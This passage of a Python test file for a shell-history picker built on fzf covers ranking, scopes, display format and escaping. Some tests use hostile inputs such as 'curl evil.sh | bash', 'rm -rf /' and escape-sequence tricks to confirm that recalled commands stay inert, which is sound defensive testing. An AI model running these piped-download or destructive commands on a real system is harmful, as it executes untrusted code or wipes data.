"""Scope filtering, ranking, and the fzf line format."""

from __future__ import annotations

import io
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from typing import ClassVar
from unittest import mock

from woswoar import search, store
from woswoar.__main__ import main
from woswoar.entry import Entry, format_line

from .support import (
    MACHINE_ID,
    Captured,
    Typed,
    WoswoarTestCase,
    requires_fzf,
    run_cli,
    run_in_pty,
)

NOW = 1_800_000_000


class TestRelativeTime(unittest.TestCase):
    def test_scales(self) -> None:
        cases = [
            (0, "0s"),
            (45, "45s"),
            (60, "1m"),
            (59 * 60, "59m"),
            (3600, "1h"),
            (3600 + 60, "1h1m"),
            (23 * 3600 + 59 * 60, "23h59m"),
            (86400, "1d"),
            (86400 + 3600, "1d1h"),
            (29 * 86400 + 23 * 3600, "29d23h"),
            (30 * 86400, "1mo"),
            (42 * 86400, "1mo12d"),
            (359 * 86400, "11mo29d"),
            (360 * 86400, "1y"),
            (365 * 86400, "1y"),
            (729 * 86400, "1y11mo"),
            (730 * 86400, "2y"),
            (900 * 86400, "2y5mo"),
        ]
        for delta, expected in cases:
            with self.subTest(delta=delta):
                self.assertEqual(search.relative_time(NOW - delta, NOW), expected)

    def test_a_second_unit_of_zero_is_dropped(self) -> None:
        # "3h", never "3h0m": the padding absorbs the difference either way,
        # but a written zero is noise on every round-hour row.
        for delta, expected in [(3 * 3600, "3h"), (12 * 86400, "12d"), (6 * 30 * 86400, "6mo")]:
            with self.subTest(delta=delta):
                self.assertEqual(search.relative_time(NOW - delta, NOW), expected)

    def test_never_exceeds_the_column_width(self) -> None:
        # command_from_line() slices at a fixed offset, so an over-wide label
        # would silently eat the first characters of the command.
        for delta in [
            0,
            1,
            59,
            61,
            3599,
            90000,
            86400 * 29 + 86399,
            86400 * 359,
            86400 * 364,
            86400 * 729,
            86400 * 365 * 40,
            86400 * 365 * 200,
        ]:
            with self.subTest(delta=delta):
                self.assertLessEqual(
                    len(search.relative_time(NOW - delta, NOW)), search._TIME_WIDTH
                )

    def test_clock_skew_from_another_machine_is_tolerated(self) -> None:
        self.assertEqual(search.relative_time(NOW + 500, NOW), "now")


class TestRankRows(unittest.TestCase):
    @staticmethod
    def rows(*pairs: tuple[int, str]) -> tuple[list[str], ...]:
        """Stamps and exit codes come out of the cache as strings, so that is
        what goes in. These cases are about order, so everything succeeded."""
        return (
            [str(ts) for ts, _ in pairs],
            [cmd for _, cmd in pairs],
            ["0"] * len(pairs),
            [MACHINE_ID] * len(pairs),
        )

    def test_newest_first(self) -> None:
        ranked = search.rank_rows(self.rows((1, "old"), (3, "new"), (2, "mid")))
        self.assertEqual([cmd for _, cmd, _, _ in ranked], ["new", "mid", "old"])

    def test_dedup_keeps_the_most_recent_occurrence(self) -> None:
        self.assertEqual(
            search.rank_rows(self.rows((1, "git status"), (5, "git status"), (3, "ls"))),
            [(5, "git status", "0", MACHINE_ID), (3, "ls", "0", MACHINE_ID)],
        )

    def test_dedup_can_be_disabled(self) -> None:
        self.assertEqual(len(search.rank_rows(self.rows((1, "ls"), (2, "ls")), dedup=False)), 2)

    def test_the_extra_columns_are_ranked_by_the_same_function(self) -> None:
        """The preview's three ride along rather than being ordered separately,
        which is what lets `--show n` and line `n` of the list mean one row."""
        stamps, commands, codes, hosts = self.rows((1, "old"), (3, "new"))
        ranked = search.rank_rows((stamps, commands, codes, hosts, ["~/first", "~/second"]))
        self.assertEqual(
            [(row[1], row[4]) for row in ranked], [("new", "~/second"), ("old", "~/first")]
        )


class TestRenderRoundTrip(unittest.TestCase):
    def test_command_survives_the_display_format(self) -> None:
        commands = [
            "git status",
            "awk -F'\t' '{print $1}'",
            "back\\slash",
            # A literal backslash followed by an escape letter. Without the
            # backslash being escaped, `unescape` reads this back as a real tab
            # and the recalled command is not the one that was recorded.
            "grep 'a\\tb' file",
            "über 😀",
            "x" * 300,
        ]
        lines = search.render_rows([(NOW, cmd, "0", MACHINE_ID) for cmd in commands], now=NOW)

        for line, cmd in zip(lines, commands, strict=True):
            with self.subTest(cmd=cmd):
                # One entry must occupy exactly one line, or fzf would show a
                # multi-line command as several unrelated candidates.
                self.assertNotIn("\n", line)
                self.assertEqual(search.command_from_line(line), cmd)


def recalled(scope: search.Scope) -> list[str]:
    """Every command a scope shows, as the picker recovers them.

    One width, decided once and used for both halves -- which is the rule
    `command_from_line` exists to enforce, and the reason this is one function
    rather than a copy per test class: the picker's reload runs in another
    process, so a machine arriving in between must not be able to make the two
    sides disagree and slice somebody's command in the wrong place.
    """
    width = search.host_width_for(set(store.host_names()))
    return [
        search.command_from_line(line, width) for line in search.lines_for(scope, host_width=width)
    ]


def run_binding(binding: str, marker: str, prompt: str | None = None) -> str:
    """Run the `sh` out of one fzf binding, with the prompt fzf would export.

    Four test classes drive a binding this way -- the cycle, the timeline, the
    preview, and the prompt-repaint check -- and what they share is not the
    binding but the *environment*: an `$FZF_PROMPT` and nothing else, because
    what is under test is a decision this snippet makes from that one variable.
    One function rather than a copy per class, for the reason `recalled` above
    is one function: the day fzf exports something else, there is one place to
    say so.

    ``prompt`` of `None` leaves `$FZF_PROMPT` unset, which is a different case
    from empty and is the one the preview has to fail closed on.
    """
    env = {"PATH": "/usr/bin:/bin"}
    if prompt is not None:
        env["FZF_PROMPT"] = prompt
    return subprocess.run(
        ["sh", "-c", binding.split(marker, 1)[1]],
        capture_output=True,
        text=True,
        env=env,
        check=True,
    ).stdout


def as_fzf_would(binding: str, index: str) -> str:
    """``binding`` with `{n}` resolved the way fzf resolves it before running.

    ``index`` is the empty string for "no current item", which is what fzf
    substitutes there -- measured against 0.73.1 with a query matching nothing,
    because the manual documents the placeholder and not that case.

    The escaped `\\{n}` is deliberately left alone: fzf consumes the backslash
    and passes the placeholder through, which is the whole reason the preview
    spells it that way. A plain `str.replace` would rewrite it too and this
    would stop resembling what happens.
    """
    return re.sub(r"(?<!\\)\{n}", index, binding)


#: Every scope's direct key, spelled as fzf takes it. Hand-written rather than
#: read out of `search.KEYS`: a test that derived the key the way the code does
#: would agree with it about a wrong one. Asserted against `search.SCOPES` so a
#: scope added there without a key fails here.
SCOPE_KEYS: dict[str, str] = {
    "global": "ctrl-g",
    "host": "ctrl-h",
    "session": "ctrl-s",
    "dir": "ctrl-o",
}


class TestScope(WoswoarTestCase):
    """Driven through `lines_for`, which is the path Ctrl-R takes.

    These used to call `filter_scope` on a hand-built list. That function is
    gone -- the scopes are answered from the cache's columns now, and `host`
    without looking at a single row, because the host belongs to the file. A
    test of the old helper would have kept passing while the live path did
    something else, which is exactly what happened when this was written.
    """

    def record(self, ts: int, cmd: str, host: str = MACHINE_ID, session: str = "here") -> None:
        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
            handle.write(format_line(Entry(ts, host, session, "/tmp", 0, 0, cmd)) + "\n")

    def setUp(self) -> None:
        super().setUp()
        self.record(1, "mine, this shell")
        self.record(2, "mine, other shell", session="elsewhere")
        self.record(3, "another machine", host="ffffffffffffffff", session="remote")

    commands = staticmethod(recalled)

    def test_global_keeps_everything(self) -> None:
        self.assertEqual(len(self.commands("global")), 3)

    def test_host_keeps_this_machine(self) -> None:
        self.assertEqual(sorted(self.commands("host")), ["mine, other shell", "mine, this shell"])

    def test_session_keeps_this_shell(self) -> None:
        os.environ["WOSWOAR_SESSION"] = "here"
        self.assertEqual(self.commands("session"), ["mine, this shell"])

    def test_session_without_the_hook_is_empty_not_an_error(self) -> None:
        os.environ.pop("WOSWOAR_SESSION", None)
        self.assertEqual(self.commands("session"), [])


class TestFzfArgv(unittest.TestCase):
    def test_matching_is_restricted_to_the_command_column(self) -> None:
        # Without --nth=2.., a query like "3d" would match the relative-time
        # column and surface unrelated entries.
        self.assertIn("--nth=2..", search._fzf_argv("global", "", True, 0))

    def test_scope_keys_reload_the_right_scope(self) -> None:
        argv = search._fzf_argv("global", "", True, 0)
        binds = " ".join(a for a in argv if a.startswith("--bind="))
        self.assertEqual(sorted(SCOPE_KEYS), sorted(search.SCOPES), "a scope with no direct key")
        for scope in search.SCOPES:
            self.assertIn(f"{SCOPE_KEYS[scope]}:reload(", binds)
            # `--colour` too: the reload's output goes back into fzf, which was
            # started with `--ansi`, so a scope switch that dropped it would
            # silently stop marking failures.
            self.assertIn(f"list --colour --host-width 0 --scope {scope}", binds)

    def test_the_dir_key_is_one_fzf_has_not_taken(self) -> None:
        """An fzf default binding would win, so the key would do fzf's thing and
        never woswoar's. `ctrl-d` is the one this rules out by name: it is fzf's
        `delete-char/eof`, which *aborts the picker* on an empty query."""
        binds = " ".join(a for a in search._fzf_argv("global", "", True, 0) if "--bind=" in a)
        self.assertIn("ctrl-o:reload(", binds)
        for taken in ("ctrl-a", "ctrl-b", "ctrl-d", "ctrl-e", "ctrl-f", "ctrl-k", "ctrl-u"):
            self.assertNotIn(f"{taken}:", binds, f"{taken} is one of fzf's own")

    def test_no_dedup_propagates_into_the_reload_command(self) -> None:
        argv = search._fzf_argv("global", "", False, 0)
        self.assertIn("--no-dedup", " ".join(a for a in argv if a.startswith("--bind=")))


MINUTE, HOUR, DAY = 60, 3600, 86400

#: The history from the report this came out of, newest first -- which is the
#: order `rank_rows` hands to fzf, so any deviation in the output below is
#: fzf's ranking and nothing else. Every one of these matches "sync" equally
#: well as far as fzf's score is concerned, which is the whole point: with the
#: scores tied, the tiebreak decides the entire list.
SYNC_HISTORY = [
    (3 * MINUTE, "woswoar sync"),
    (15 * MINUTE, "time woswoar sync"),
    (10 * HOUR, "sync"),
    (10 * HOUR, "synci"),
    (10 * HOUR, "atuin sync"),
    (10 * HOUR, "chmod a+x sync_claude_skills.py"),
    (11 * DAY, "sync; echo 3 | sudo tee /proc/sys/vm/drop_caches"),
    (2 * 30 * DAY, "sync_claude_skills.py"),
    (2 * 30 * DAY, "atuin sync -f"),
    (3 * 30 * DAY, "aimgr repo sync"),
    (365 * DAY, "sudo sync; echo 3 > /proc/sys/vm/drop_caches"),
    (365 * DAY, "atuin sync -h"),
    (365 * DAY, "chezmoi sync"),
    (365 * DAY, "time m clean && time m && time sync"),
]


@requires_fzf
class TestRealFzfRanking(unittest.TestCase):
    """The order fzf actually produces, out of the real binary.

    `--filter` does the same match-and-sort without needing a terminal, so this
    drives the argv Ctrl-R uses rather than a copy of it: a change to `--nth` or
    `--tiebreak` reaches this test. Nothing here can be asserted against a
    stand-in -- the behaviour under test is fzf's, not woswoar's.
    """

    def filtered(self, query: str) -> subprocess.CompletedProcess[str]:
        """The fixture through the real fzf, with the real argv."""
        lines = search.render_rows(
            [(NOW - age, cmd, "0", MACHINE_ID) for age, cmd in SYNC_HISTORY], now=NOW
        )
        # No `check`: 1 means "nothing matched", which one test below wants.
        return subprocess.run(
            [*search._fzf_argv("global", "", True, 0), f"--filter={query}"],
            input="\n".join(lines) + "\n",
            capture_output=True,
            text=True,
        )

    def ordered(self, query: str) -> list[str]:
        completed = self.filtered(query)
        self.assertEqual(completed.returncode, 0, completed.stderr)
        return [search.command_from_line(line) for line in completed.stdout.splitlines()]

    def test_the_newest_match_comes_first(self) -> None:
        self.assertEqual(self.ordered("sync")[0], "woswoar sync")

    def test_an_old_command_does_not_outrank_a_recent_one_for_starting_sooner(self) -> None:
        """The report: a year-old entry above the command actually wanted.

        The pair is chosen so that only the tiebreak can separate them. The
        year-old one matches *earlier* in its line -- offset 5 in `sudo sync`
        against 8 in `woswoar sync` -- so under `begin` it wins however recent
        the other is, and under `index` it cannot.
        """
        order = self.ordered("sync")
        self.assertLess(
            order.index("woswoar sync"),
            order.index("sudo sync; echo 3 > /proc/sys/vm/drop_caches"),
            "a year-old command outranked one from three minutes ago",
        )

    def test_the_width_of_the_time_column_does_not_rank(self) -> None:
        """`atuin sync` and `atuin sync -h` match at the same offset.

        What differs is the column in front: "1y" is right-aligned into four
        characters and so carries one more leading space than "10h". fzf scores
        `begin` as (match offset - leading whitespace), which turned that
        padding into a ranking signal and put the year-old line first.
        """
        order = self.ordered("atuin sync")
        self.assertLess(
            order.index("atuin sync"),
            order.index("atuin sync -h"),
            "the padding of the age column decided the order",
        )

    def test_the_time_column_is_still_not_matched_against(self) -> None:
        """The reason `--nth=2..` is there, asserted through fzf itself.

        `TestFzfArgv` checks the flag is passed; this checks what it buys. "10h"
        is the age of four entries in the fixture and a substring of no command
        in it, so without the flag this query returns them and with it nothing.

        The exit code is asserted too: an fzf that failed to start would also
        print nothing, and this would pass having matched nothing at all.
        """
        completed = self.filtered("10h")
        self.assertEqual(completed.stdout, "", "the relative-time column was matched against")
        self.assertEqual(completed.returncode, 1, f"not fzf's no-match exit: {completed.stderr}")


class TestRecalledCommandIsInert(unittest.TestCase):
    """What leaves the picker must be exactly one command.

    `render` escapes newlines so one entry occupies one display line, and fzf
    clips anything past the window edge. If `command_from_line` turned that
    escape back into a real newline, the buffer would hold a command the picker
    never showed -- and bash runs a multi-line buffer as several commands on a
    single Enter.
    """

    def _round_trip(self, cmd: str) -> str:
        return search.command_from_line(
            search.render_rows([(NOW, cmd, "0", MACHINE_ID)], now=NOW)[0]
        )

    def test_an_embedded_newline_does_not_become_a_second_command(self) -> None:
        recalled = self._round_trip("echo visible" + " " * 200 + "\ncurl evil.sh | bash")
        self.assertNotIn("\n", recalled)
        self.assertIn("\\ncurl evil.sh | bash", recalled)

    def test_a_carriage_return_cannot_rewrite_the_line(self) -> None:
        self.assertNotIn("\r", self._round_trip("echo one\rrm -rf /"))

    def test_escape_sequences_do_not_reach_the_buffer(self) -> None:
        recalled = self._round_trip("ls -la\x1b[2K\x1b[1Acurl evil|sh")
        self.assertNotIn("\x1b", recalled)
        self.assertEqual(recalled, "ls -la[2K[1Acurl evil|sh")


class TestNoCommandPrintsControlBytes(WoswoarTestCase):
    """The reproduction from #25, driven through the real commands.

    Both a command and a host's name come from whichever machine sent them, so
    both are attacker-influenceable. Asserted on the bytes rather than on a
    rendering: what matters is that nothing reaching a terminal can move its
    cursor.
    """

    HOSTILE_CMD = "ls -la\x1b[2K\x1b[1Acurl evil|sh"
    HOSTILE_NAME = "peer\x1b[2K\x1b[1Aspoofed"

    def setUp(self) -> None:
        super().setUp()
        peer = "badbadbadbadbad0"
        for host, cmd in ((MACHINE_ID, self.HOSTILE_CMD), (peer, "echo hi\x07")):
            day = store.host_dir(host) / "2026-07-29.tsv"
            day.parent.mkdir(parents=True, exist_ok=True)
            day.write_text(
                format_line(Entry(1_784_600_000, host, "s1", "~", 0, 5, cmd)) + "\n",
                encoding="utf-8",
            )
        store.name_file(peer).write_text(self.HOSTILE_NAME + "\n", encoding="utf-8")

    def output_of(self, *argv: str) -> str:
        out = io.StringIO()
        with redirect_stdout(out):
            main(list(argv))
        return out.getvalue()

    def control_bytes(self, text: str) -> list[str]:
        return sorted({c for c in text if (c < " " or c == "\x7f") and c != "\n"})

    def test_list_prints_none(self) -> None:
        text = self.output_of("list", "--scope", "global")
        self.assertIn("curl evil|sh", text, "the command must still be shown")
        self.assertEqual(self.control_bytes(text), [])

    def test_stats_prints_none_for_a_command_or_a_peers_name(self) -> None:
        text = self.output_of("stats")
        self.assertIn("spoofed", text, "the name must still be shown")
        self.assertEqual(self.control_bytes(text), [])

    def test_import_prints_no_control_bytes_for_a_peers_machine_name(self) -> None:
        """atuin keeps every machine it synced with, so these names are foreign.

        The display site the per-site rule had already been forgotten at, which
        is why the command itself is now handled once in the cache instead.
        """
        db = self.root / "history.db"
        conn = sqlite3.connect(db)
        conn.execute(
            "CREATE TABLE history (id text primary key, timestamp integer, duration integer,"
            " exit integer, command text, cwd text, session text, hostname text,"
            " deleted_at integer, author text, intent text)"
        )
        conn.executemany(
            "INSERT INTO history (id, timestamp, duration, exit, command, cwd, session, hostname)"
            " VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            [
                ("a", 1_784_600_000 * 10**9, 10**9, 0, "git status", "/tmp", "s1", "box:me"),
                ("b", 1_784_600_001 * 10**9, 10**9, 0, "ls", "/tmp", "s1", self.HOSTILE_NAME),
            ],
        )
        conn.commit()
        conn.close()

        text = self.output_of("import", "atuin", "--file", str(db))
        self.assertIn("per machine", text, "both machines must be listed")
        self.assertEqual(self.control_bytes(text), [])


if __name__ == "__main__":
    unittest.main()


class TestThePickerAppearsBeforeTheHistoryIsBuilt(WoswoarTestCase):
    """fzf is started first, and fed afterwards.

    Measured on a real 55,000-command atuin history: the picker used to appear
    after 121 ms, because nothing was spawned until every line had been loaded,
    sorted, deduplicated and rendered. Starting fzf first puts it on screen at
    41 ms -- the work is identical, but you spend it looking at the picker
    instead of at nothing.
    """

    def fake_fzf(self, script: str) -> None:
        """Put a stand-in for fzf first on PATH.

        A real fzf needs a terminal, and CI has neither. What is under test is
        woswoar's half of the conversation -- when the process is started, what
        is written to it, and what happens when it leaves early -- so the stand
        -in is the real subprocess boundary with a scripted other end.
        """
        binary = Path(self.root) / "bin" / "fzf"
        binary.parent.mkdir(parents=True, exist_ok=True)
        binary.write_text(f"#!/usr/bin/env python3\n{script}")
        binary.chmod(0o755)
        os.environ["PATH"] = f"{binary.parent}{os.pathsep}{os.environ['PATH']}"

    def some_history(self) -> None:
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(5):
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, f"cmd {i}")))
                handle.write("\n")

    def test_fzf_is_running_before_the_lines_exist(self) -> None:
        """The whole change, stated as an order of events.

        The stand-in is installed even though `Popen` is mocked: `interactive`
        looks fzf up on PATH first and returns early if it is missing, so
        without this the test asserts nothing on any machine that lacks fzf --
        which is every CI runner here, and is exactly how it first went red.
        """
        self.fake_fzf("import sys\n")
        self.some_history()
        order: list[str] = []

        class Spawned:
            def __init__(self, *args: object, **kwargs: object) -> None:
                order.append("picker")
                self.stdin = io.StringIO()
                self.stdout = io.StringIO("")

            def wait(self) -> int:
                return 130  # as Esc does

        def slow_lines(*args: object, **kwargs: object) -> list[str]:
            order.append("history")
            return ["     1s  cmd 0"]

        with (
            mock.patch("subprocess.Popen", Spawned),
            mock.patch.object(search, "lines_for", slow_lines),
            # The version probe would otherwise be caught by the fake `Popen`
            # above -- `subprocess.run` uses it. This test is about the order of
            # two things, not about which fzf is installed.
            mock.patch.object(search, "fzf_supports_transform", return_value=False),
        ):
            search.interactive("global")

        self.assertEqual(order, ["picker", "history"], "the picker waited for the history")

    def test_the_lines_reach_fzf(self) -> None:
        self.some_history()
        self.fake_fzf("import sys\nprint(sys.stdin.read().splitlines()[0])\n")
        with redirect_stdout(io.StringIO()):
            chosen = search.interactive("global")
        self.assertEqual(chosen, "cmd 0", "the newest entry did not survive the round trip")

    def test_fzf_leaving_early_is_not_an_error(self) -> None:
        """Selecting the first line the instant it appears closes the pipe
        under us, and the write has to tolerate that at any point.

        The history has to be bigger than a pipe buffer -- 64 KiB on Linux --
        or the write lands in the buffer and returns happily even though
        nothing will ever read it, and this passes with the handling removed.
        Five short lines did exactly that.
        """
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(2000):
                padded = f"cmd {i} " + "x" * 200
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, padded)))
                handle.write("\n")
        self.assertGreater(
            sum(len(line) for line in search.lines_for("global")),
            1 << 16,
            "precondition: more than one pipe buffer of history",
        )
        # Exits without reading stdin at all -- the harshest version.
        self.fake_fzf("import sys\nsys.exit(130)\n")
        with redirect_stdout(io.StringIO()):
            self.assertIsNone(search.interactive("global"))

    def test_a_machine_with_no_history_opens_no_picker(self) -> None:
        """Ctrl-R on a fresh install did nothing, and must keep doing nothing
        rather than opening an empty picker to escape out of.

        The marker is written by the stand-in itself, so this fails if fzf is
        started at all -- asserting on a file nothing ever creates would pass
        either way, which is what the first version of this test did.
        """
        started = Path(self.root) / "fzf-was-started"
        self.fake_fzf(f"import pathlib\npathlib.Path({str(started)!r}).write_text('yes')\n")

        # The stand-in really does write it when it runs, or the test below is
        # asserting the absence of something that never appears anyway.
        subprocess.run([str(Path(self.root) / "bin" / "fzf")], check=True)
        self.assertTrue(started.exists(), "precondition: the marker works")
        started.unlink()

        with redirect_stdout(io.StringIO()):
            self.assertIsNone(search.interactive("global"))
        self.assertFalse(started.exists(), "an empty history opened a picker")

    def test_many_lines_survive_the_chunking(self) -> None:
        """More than one chunk, so the loop runs more than once."""
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(search._CHUNK * 2 + 7):
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, f"cmd {i}")))
                handle.write("\n")
        self.fake_fzf("import sys\nseen = sys.stdin.read().splitlines()\nprint(seen[-1])\n")
        with redirect_stdout(io.StringIO()):
            chosen = search.interactive("global")
        self.assertEqual(chosen, f"cmd {search._CHUNK * 2 + 6}", "a chunk went missing")


#: What fzf hands back with `--ansi`: the line, with every escape removed.
_ESCAPES = re.compile(r"\x1b\[[0-9;]*m")


def unstyled(line: str) -> str:
    return _ESCAPES.sub("", line)


class TestFailedCommandsAreMarked(WoswoarTestCase):
    """Colour by exit status, which the picker can show and a pipe must not."""

    def rows(self, codes: tuple[int, int] = (0, 1)) -> list[str]:
        good, bad = codes
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
            for ts, code, cmd in ((NOW - 1, good, "worked"), (NOW, bad, "failed")):
                handle.write(format_line(Entry(ts, MACHINE_ID, "s1", "~", code, 1, cmd)) + "\n")
        return search.lines_for("global", colour=True)

    def test_a_failure_is_marked_and_a_success_is_not(self) -> None:
        failed, worked = self.rows()
        self.assertIn("failed", failed)
        self.assertIn(search._FAILED, failed, f"not marked: {failed!r}")
        self.assertIn(search._RESET, failed, "the colour is never reset")
        self.assertFalse(failed.endswith(search._RESET), "the whole line is coloured again")
        self.assertIn("worked", worked)
        self.assertNotIn("\x1b[", worked, "a command that succeeded was marked")

    def test_only_the_age_is_coloured_not_the_whole_line(self) -> None:
        """Reported as "a bit much if the whole line is red" -- and on a history
        with any real proportion of failures, a mark covering half the lines has
        stopped marking anything."""
        (failed, _) = self.rows()
        before, _, after = failed.partition(search._RESET)
        self.assertNotIn("failed", before, "the command itself is inside the colour")
        self.assertIn("failed", after)
        # The escapes wrap the age and nothing else, so what they contain is
        # exactly what `relative_time` produced, padding included.
        self.assertEqual(before.removeprefix(search._FAILED).strip(), "now")

    def test_the_columns_still_line_up(self) -> None:
        """The escapes go outside the padding, so a coloured line and a plain
        one are the same width once fzf has stripped them."""
        failed, worked = self.rows()
        self.assertEqual(len(unstyled(failed)) - len("failed"), len(worked) - len("worked"))

    def test_an_unknown_exit_code_is_not_a_failure(self) -> None:
        """`~/.bash_history` and `~/.zsh_history` carry no exit codes at all, so
        `importer` records -1. Treating "anything but 0" as failure painted a
        freshly imported history entirely red, which is what this is for."""
        for unknown in (-1, -2):
            with self.subTest(code=unknown):
                self.setUp()
                failed, worked = self.rows(codes=(unknown, unknown))
                for line in (failed, worked):
                    self.assertNotIn("\x1b[", line, f"an unknown code was marked: {line!r}")

    def test_what_counts_as_failure_is_decided_in_one_place(self) -> None:
        """So a fourth caller cannot invent a fifth answer."""
        self.assertFalse(search.is_failure("0"))
        self.assertFalse(search.is_failure(""))
        self.assertFalse(search.is_failure("-1"))
        self.assertFalse(search.is_failure("not-a-number"))
        self.assertTrue(search.is_failure("1"))
        self.assertTrue(search.is_failure("130"))

    def test_plain_by_default_so_a_pipe_stays_plain(self) -> None:
        """`woswoar list | grep` is a documented thing to do."""
        self.rows()
        for line in search.lines_for("global"):
            self.assertNotIn("\x1b[", line)

    def test_the_command_still_comes_back_out(self) -> None:
        """fzf strips the escapes from what it returns, so the fixed-width
        prefix `command_from_line` slices is unchanged -- but if that ever stops
        being true, this is where it shows."""
        failed, _ = self.rows()
        self.assertEqual(search.command_from_line(unstyled(failed)), "failed")

    def test_a_command_cannot_smuggle_its_own_escapes(self) -> None:
        """The whole reason `--ansi` is safe. `make_inert` removes every C0
        byte on the way into the cache, so a peer's history cannot colour
        itself, hide a line, or drive the terminal."""
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
            handle.write(
                format_line(Entry(NOW, MACHINE_ID, "s1", "~", 0, 1, "echo \x1b[1A\x1b[2K gone"))
                + "\n"
            )
        (line,) = search.lines_for("global", colour=True)
        self.assertNotIn("\x1b", line, f"an escape survived into the picker: {line!r}")


class TestTheMachineColumn(WoswoarTestCase):
    """Which machine ran it, shown only when there is more than one.

    Asked for as "filter by a specific host, but I'm not sure how to make that
    conveniently usable" -- so there is no new key and no new mode. The name is
    in the line and fzf matches from the second field on, which makes filtering
    by machine the same gesture as filtering by anything else: typing it.
    """

    OTHER = "ffffffffffffffff"

    def record(self, host: str, cmd: str, ts: int = NOW) -> None:
        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
            handle.write(format_line(Entry(ts, host, "s1", "~", 0, 1, cmd)) + "\n")

    def test_one_machine_gets_no_column(self) -> None:
        """Every single-machine install, and the whole of the Quick Start."""
        self.record(MACHINE_ID, "git status")
        self.assertEqual(search.host_width_for({MACHINE_ID}), 0)
        (line,) = search.lines_for("global")
        # The time column is right-aligned in seven, so "now" leaves four.
        self.assertEqual(line, "    now  git status")

    def test_two_machines_get_one(self) -> None:
        self.record(MACHINE_ID, "mine")
        self.record(self.OTHER, "theirs", ts=NOW - 1)
        store.write_atomic(store.name_file(self.OTHER), b"work-laptop\n")
        store.write_atomic(store.name_file(MACHINE_ID), b"desktop\n")

        width = search.host_width_for({MACHINE_ID, self.OTHER})
        self.assertEqual(width, len("work-laptop"))
        mine, theirs = search.lines_for("global", host_width=width)
        self.assertIn("desktop", mine)
        self.assertIn("work-laptop", theirs)

    def test_the_command_still_comes_back_out(self) -> None:
        """The recall path, which the column moves. `command_from_line` is told
        the width rather than guessing it, because the picker's reload runs in
        another process and a machine arriving in between would otherwise make
        the two disagree and slice somebody's command in the wrong place."""
        self.record(MACHINE_ID, "cargo build --release")
        self.record(self.OTHER, "theirs", ts=NOW - 1)
        width = search.host_width_for({MACHINE_ID, self.OTHER})
        line = search.lines_for("global", host_width=width)[0]
        self.assertEqual(search.command_from_line(line, width), "cargo build --release")

    def test_an_unnamed_machine_shows_a_short_id_not_sixteen_hex(self) -> None:
        self.record(MACHINE_ID, "mine")
        self.record(self.OTHER, "theirs", ts=NOW - 1)
        self.assertEqual(search.host_label(self.OTHER), self.OTHER[:8])

    def test_a_machine_name_cannot_drive_the_terminal(self) -> None:
        """The name is another machine's text -- `_merge_name` writes whatever
        decrypted out of its `name.age` straight to disk, and sealing one needs
        no secret. Harmless while the picker was escape-free; with `--ansi` it
        is a way to erase the line above, so it is neutralised here."""
        store.write_atomic(store.name_file(self.OTHER), b"ok\x1b[1A\x1b[2K\n")
        self.assertNotIn("\x1b", search.host_label(self.OTHER))


class TestCtrlRCyclesTheScope(unittest.TestCase):
    """Ctrl-R inside the picker moves global -> host -> session -> dir -> global.

    fzf holds no variables, so the binding reads the current scope back out of
    the prompt fzf is already showing. What is asserted here is that shell
    script, run the way fzf runs it: the decision it makes is the part that can
    be wrong, and it needs no terminal.

    The keypress itself is not driven here -- fzf needs a tty and the result was
    not something I could assert reliably. The binding's *shape* is checked
    against a real fzf's acceptance by `TestRealFzfRanking`, which runs one.
    """

    def next_scope(self, prompt: str) -> str:
        out = run_binding(
            search._cycle_binding("woswoar", "", " --host-width 0"), "transform:", prompt
        )
        return out.split("--scope ", 1)[1].split(")", 1)[0].strip()

    def test_it_goes_round(self) -> None:
        """Every scope's successor, driven off `SCOPES` so the two cannot drift.

        Written out as three assertions before, which is how `session -> global`
        stayed correct by *accident*: it was falling through the catch-all
        rather than being decided, so the arm it needed once something followed
        it was never missed."""
        for index, scope in enumerate(search.SCOPES):
            with self.subTest(scope=scope):
                nxt = search.SCOPES[(index + 1) % len(search.SCOPES)]
                self.assertEqual(self.next_scope(f"woswoar ({scope}) "), nxt)

    def test_an_unrecognised_prompt_degrades_to_global(self) -> None:
        """Which is what the catch-all is for, and why `session` needed an arm
        of its own rather than keeping the fall-through it used to have."""
        self.assertEqual(self.next_scope(""), "global")

    def test_the_prompt_starts_with_the_scope(self) -> None:
        """The prompt is where the scope is *kept* -- fzf has no variables, so
        the cycle and the preview read it back out of `$FZF_PROMPT`. What the
        arms require is the prefix; anything after it is free, which is what
        lets `dir` name its directory.

        Asserted on the prompt fzf is given and on the one the cycle repaints,
        because those are the two places it is written.
        """
        for scope in search.SCOPES:
            with self.subTest(scope=scope):
                argv = search._fzf_argv(scope, "", True, 0)
                prompt = next(a for a in argv if a.startswith("--prompt="))
                self.assertTrue(prompt.startswith(f"--prompt=woswoar ({scope}"), prompt)
        binding = search._cycle_binding("woswoar", "", " --host-width 0")
        self.assertIn("change-prompt(woswoar (", binding)

    def test_every_scope_name_still_survives_a_path_that_names_another(self) -> None:
        """The constraint that used to live here, lifted -- and generalised.

        A single test used to pin the *misrouting*: `woswoar (dir
        ~/src/session-manager)` read as `session` under the substring arms and
        went to `dir` instead of round to `global`, silently, while showing the
        right list. That case is `(dir, session)` in the grid below; every other
        pair is the same hazard for a scope nobody thought to try.
        """
        for scope in search.SCOPES:
            for other in search.SCOPES:
                with self.subTest(scope=scope, path=other):
                    prompt = f"woswoar ({scope} ~/src/{other}-manager) "
                    self.assertEqual(self.next_scope(prompt), search._NEXT[scope])

    def test_it_repaints_the_prompt_it_reads_back(self) -> None:
        """`change-prompt` is not decoration: the next press reads it.

        Against `_prompt_for` rather than a literal `woswoar (host) `. This
        class is not sandboxed -- it drives the emitted shell and nothing else --
        so a literal made the assertion depend on whether the machine running
        the suite happens to have a name woswoar can show. It named the
        developer's laptop the day `host` gained a label.
        """
        out = run_binding(
